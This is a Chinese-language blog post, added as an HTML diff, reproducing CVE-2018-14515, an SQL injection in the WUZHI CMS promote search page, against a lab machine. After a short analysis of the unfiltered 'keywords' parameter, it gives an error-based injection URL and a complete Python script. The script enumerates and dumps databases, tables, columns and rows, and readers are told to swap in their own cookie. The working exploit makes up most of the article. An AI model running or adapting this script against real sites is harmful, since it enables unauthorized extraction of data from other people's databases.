@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"windy-purple.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一、环境Windows NT WIN-RRI9T9SN85D 6.1 build 7600 (Windows 7 Business Edition) i586 Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.4.45 靶机：192.168.16.129 攻击机：192.168.16.127  二、漏洞分析    在search函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cve-2018-14515复现">
+<meta property="og:url" content="https://windy-purple.github.io/2018/12/28/37/index.html">
+<meta property="og:site_name" content="windy_ll">
+<meta property="og:description" content="一、环境Windows NT WIN-RRI9T9SN85D 6.1 build 7600 (Windows 7 Business Edition) i586 Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.4.45 靶机：192.168.16.129 攻击机：192.168.16.127  二、漏洞分析    在search函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/7.png">
+<meta property="article:published_time" content="2018-12-27T16:54:37.000Z">
+<meta property="article:modified_time" content="2024-11-12T14:51:27.194Z">
+<meta property="article:author" content="windy_ll">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/1.png">
+
+<link rel="canonical" href="https://windy-purple.github.io/2018/12/28/37/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>cve-2018-14515复现 | windy_ll</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">windy_ll</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2018/12/28/37/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="windy_ll">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="windy_ll">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cve-2018-14515复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-12-28 00:54:37" itemprop="dateCreated datePublished" datetime="2018-12-28T00:54:37+08:00">2018-12-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-12 22:51:27" itemprop="dateModified" datetime="2024-11-12T22:51:27+08:00">2024-11-12</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h1><p>Windows NT WIN-RRI9T9SN85D 6.1 build 7600 (Windows 7 Business Edition) i586</p>
+<p>Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j PHP&#x2F;5.4.45</p>
+<p>靶机：192.168.16.129</p>
+<p>攻击机：192.168.16.127</p>
+<hr>
+<h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/1.png" alt="1.png"></p>
+<p>   <strong>在search函数内，首先判断page变量是否已定义，若未定义，将处理后的全局变量赋值给局部变量page，然后将局部变量page与1比较大小，然后将全局变量fieldtype和keywords分别赋值给局部变量fieldtype和keywords。在判断fieldtype的值，在做相应连接数据库的操作。</strong></p>
+<p>   <strong>代码未对传入进来的参数做相应的过滤，通过覆盖全局变量的方式，即可插入恶意代码，达到脱库的目的。</strong></p>
+<hr>
+<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><p>   <strong>注册用户，进入后台后利用<a target="_blank" rel="noopener" href="http://192.168.116.129/">http://192.168.116.129/</a> index.php?m&#x3D;promote&amp;f&#x3D;index&amp;v&#x3D;search&amp;_su&#x3D;wuzhicms&amp;fieldtype&#x3D;place&amp;keywords&#x3D;’可以发现单引号未被过滤，利用<a target="_blank" rel="noopener" href="http://192.168.116.129/index.php?m=promote&f=index&v=search&_su=wuzhicms&fieldtype=place&keywords=%27%20and+extractvalue">http://192.168.116.129/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue</a>(1,concat(0x7e,(select database())))%23即可（图忘记截了，就不放图了）。</strong></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/2.png" alt="2.png"></p>
+<p><strong>下面利用python脚本直接爆库，先放效果图：</strong></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/3.png" alt="3.png"></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/4.png" alt="4.png"></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/5.png" alt="5.png"></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/6.png" alt="6.png"></p>
+<p><img src="https://raw.githubusercontent.com/windy-purple/blog_picture_bed/refs/heads/main/CVE-2018-14515/7.png" alt="7.png"></p>
+<p><strong>直接上代码（环境:python3.6）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">#author:windy_ll</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.116.129:8000&#x27;</span><br><span class="line">header = &#123;</span><br><span class="line">&#x27;Host&#x27;: &#x27;192.168.116.129:8000&#x27;,</span><br><span class="line">&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#x27;,</span><br><span class="line">&#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span><br><span class="line">&#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,</span><br><span class="line">&#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">&#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">&#x27;Cookie&#x27;: &#x27;PHPSESSID=1dhmdr31qhf21qeccbthsjtkk5; ReI_auth=YpulBMeZ6899eyzsh5HxUbcTdlc23iiQFSGIwpYlkLOtVPdkBc49aEAcWedq6QZ%2BaCHSr6zKJNaLYC6oDqFBzlFuZmyG9UoAvQjj5EVoP1Pa2e4uQwq86Q%3D%3D; ReI__uid=92CBGuVr6Ok2K6kWBxNbcQ%3D%3D; ReI__username=y5zrNmFTk6rooHN926QcJg%3D%3D; ReI__groupid=nAyjF%2FwRrNH%2BOMee0Fc%2Fsw%3D%3D; ReI_truename=admin; ReI_modelid=10; ReI_uid=ucD6e6GM855APZII7rll7A%3D%3D; ReI_username=2YMzaR7%2FAZU5sNME3D5XdQ%3D%3D; ReI_wz_name=z7TSlBEBFOkSFIN%2BxBxp7A%3D%3D; ReI_siteid=WxKXvTpR7lxWOkKhIDfeag%3D%3D&#x27;,</span><br><span class="line">&#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">&#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;&#125;</span><br><span class="line"></span><br><span class="line">def get_contents(html):</span><br><span class="line">    flag = 0</span><br><span class="line">    nr = &#x27;&#x27;</span><br><span class="line">    list = []</span><br><span class="line">    soup = BeautifulSoup(html.content,&#x27;lxml&#x27;)</span><br><span class="line">    list = soup.find_all(&#x27;h4&#x27;)</span><br><span class="line">    contents = list[0].span.get_text()</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i == &#x27;~&#x27;:</span><br><span class="line">            flag = 1</span><br><span class="line">        if flag == 1:</span><br><span class="line">            if i == &#x27;,&#x27; or i == &#x27;\&#x27;&#x27;:</span><br><span class="line">                if i == None:</span><br><span class="line">                    print(f&#x27;[+] no data&#x27;)</span><br><span class="line">                else:</span><br><span class="line">                    print(f&#x27;[+] &#123;nr&#125;&#x27;)</span><br><span class="line">                nr = &#x27;&#x27;</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                if i != &#x27;\&#x27;&#x27; and i != &#x27;~&#x27;:</span><br><span class="line">                    nr += str(i)</span><br><span class="line"></span><br><span class="line">def get_columns(html):</span><br><span class="line">    flag = 0</span><br><span class="line">    nr = &#x27;&#x27;</span><br><span class="line">    list = []</span><br><span class="line">    soup = BeautifulSoup(html.content,&#x27;lxml&#x27;)</span><br><span class="line">    list = soup.find_all(&#x27;h4&#x27;)</span><br><span class="line">    contents = list[0].span.get_text()</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i == &#x27;~&#x27;:</span><br><span class="line">            flag = 1</span><br><span class="line">        if flag == 1:</span><br><span class="line">            if i == &#x27;,&#x27; or i == &#x27;\&#x27;&#x27;:</span><br><span class="line">                return nr</span><br><span class="line">                nr = &#x27;&#x27;</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                if i != &#x27;\&#x27;&#x27; and i != &#x27;~&#x27;:</span><br><span class="line">                    nr += str(i)</span><br><span class="line">                    </span><br><span class="line">def get_num(html):</span><br><span class="line">    flag = 0</span><br><span class="line">    nr = &#x27;&#x27;</span><br><span class="line">    list = []</span><br><span class="line">    soup = BeautifulSoup(html.content,&#x27;lxml&#x27;)</span><br><span class="line">    list = soup.find_all(&#x27;h4&#x27;)</span><br><span class="line">    contents = list[0].span.get_text()</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i == &#x27;~&#x27;:</span><br><span class="line">            flag = 1</span><br><span class="line">        if flag == 1:</span><br><span class="line">            if i == &#x27;,&#x27; or i == &#x27;\&#x27;&#x27;:</span><br><span class="line">                return nr</span><br><span class="line">                nr = &#x27;&#x27;</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                if i != &#x27;\&#x27;&#x27; and i != &#x27;~&#x27;:</span><br><span class="line">                    nr += str(i)                    </span><br><span class="line">                    </span><br><span class="line">def get_count(payload):</span><br><span class="line">    r = requests.get(payload,headers = header)</span><br><span class="line">    num = get_num(r)</span><br><span class="line">    return num</span><br><span class="line">    </span><br><span class="line">def get_data():</span><br><span class="line">    payload_count = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select count(*) from information_schema.schemata)))%23&#x27;</span><br><span class="line">    num = get_count(payload_count)</span><br><span class="line">    num = int(num)</span><br><span class="line">    print(&#x27;[*]available database:&#x27;)</span><br><span class="line">    for i in range(0,num):</span><br><span class="line">        payload = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit &#x27; + str(i) + &#x27;,1)))%23&#x27;</span><br><span class="line">        r = requests.get(payload,headers = header)</span><br><span class="line">        get_contents(r)</span><br><span class="line">    print(f&#x27;[-] &#123;num&#125; database&#x27;,end=&#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">def get_tables(data):</span><br><span class="line">    payload_count = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema=\&#x27;&#x27; + str(data) + &#x27;\&#x27;)))%23&#x27;</span><br><span class="line">    num = get_count(payload_count)</span><br><span class="line">    num = int(num)</span><br><span class="line">    print(f&#x27;[*] databse &#123;data&#125;:&#x27;)</span><br><span class="line">    for i in range(0,num):</span><br><span class="line">        payload = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = \&#x27;&#x27; + data + &#x27;\&#x27; limit &#x27; + str(i) + &#x27;,1)))%23&#x27;</span><br><span class="line">        r = requests.get(payload,headers = header)</span><br><span class="line">        get_contents(r)</span><br><span class="line">    print(f&#x27;[-] &#123;num&#125; tables&#x27;,end=&#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">def get_column(table):</span><br><span class="line">    payload_count = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select count(*) from information_schema.columns where table_name=\&#x27;&#x27; + str(table) + &#x27;\&#x27;)))%23&#x27;</span><br><span class="line">    num = get_count(payload_count)</span><br><span class="line">    num = int(num)</span><br><span class="line">    print(f&#x27;[*] table &#123;table&#125;:&#x27;)</span><br><span class="line">    for i in range(0,num):</span><br><span class="line">        payload = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name = \&#x27;&#x27; + str(table) + &#x27;\&#x27; limit &#x27; + str(i) + &#x27;,1)))%23&#x27;</span><br><span class="line">        r = requests.get(payload,headers = header)</span><br><span class="line">        get_contents(r)</span><br><span class="line">    print(f&#x27;[-] &#123;num&#125; columns&#x27;,end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">def get_column_name(table):</span><br><span class="line">    list = []</span><br><span class="line">    payload_count = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select count(*) from information_schema.columns where table_name=\&#x27;&#x27; + str(table) + &#x27;\&#x27;)))%23&#x27;</span><br><span class="line">    num = get_count(payload_count)</span><br><span class="line">    num = int(num)</span><br><span class="line">    for i in range(0,num):</span><br><span class="line">        payload = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name = \&#x27;&#x27; + str(table) + &#x27;\&#x27; limit &#x27; + str(i) + &#x27;,1)))%23&#x27;</span><br><span class="line">        r = requests.get(payload,headers = header)</span><br><span class="line">        column = get_columns(r)</span><br><span class="line">        list.append(column)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">def get_table_dump(table):</span><br><span class="line">    print(f&#x27;[*] table &#123;table&#125;:&#x27;)</span><br><span class="line">    payload_count = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select count(*) from &#x27; + str(table) + &#x27;)))%23&#x27;</span><br><span class="line">    num = get_count(payload_count)</span><br><span class="line">    num = int(num)</span><br><span class="line">    list = get_column_name(table)</span><br><span class="line">    for column in list:</span><br><span class="line">        print(f&#x27;[^] column &#123;column&#125;&#x27;)</span><br><span class="line">        for i in range(0,num):</span><br><span class="line">            payload = url + &#x27;/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=%27%20and+extractvalue(1,concat(0x7e,(select &#x27; + column + &#x27; from &#x27; + table + &#x27; limit &#x27; + str(i) + &#x27;,1)))%23&#x27;</span><br><span class="line">            r = requests.get(payload,headers = header)</span><br><span class="line">            get_contents(r)</span><br><span class="line">    print(f&#x27;[-] &#123;num&#125; notes&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    parse = OptionParser()</span><br><span class="line">    parse.add_option(&#x27;-D&#x27;,action = &#x27;store&#x27;,type = &#x27;string&#x27;,dest = &#x27;database&#x27;,help = &#x27;列库&#x27;)</span><br><span class="line">    parse.add_option(&#x27;-T&#x27;,action = &#x27;store&#x27;,type = &#x27;string&#x27;,dest = &#x27;table&#x27;,help = &#x27;输入数据库名字&#x27;)</span><br><span class="line">    parse.add_option(&#x27;-d&#x27;,action = &#x27;store&#x27;,type = &#x27;string&#x27;,dest = &#x27;dump&#x27;,help = &#x27;输入数据表名字&#x27;)</span><br><span class="line">    parse.add_option(&#x27;-C&#x27;,action = &#x27;store&#x27;,type = &#x27;string&#x27;,dest = &#x27;tables&#x27;,help = &#x27;输入数据表名字&#x27;)</span><br><span class="line">    (options,args) = parse.parse_args()</span><br><span class="line">    if options.database:</span><br><span class="line">        get_data()</span><br><span class="line">    if options.table:</span><br><span class="line">        data = options.table</span><br><span class="line">        data = str(data)</span><br><span class="line">        get_tables(data)</span><br><span class="line">    if options.dump:</span><br><span class="line">        table = options.dump</span><br><span class="line">        get_table_dump(str(table))</span><br><span class="line">    if options.tables:</span><br><span class="line">        table = options.tables</span><br><span class="line">        get_column(str(table))</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p><strong>（使用脚本前将cookie换成你自己的）</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2019/11/17/21/" rel="next" title="DEX文件解析---1、dex文件头解析">
+      DEX文件解析---1、dex文件头解析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">一、环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">三、利用</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">windy_ll</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">windy_ll</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
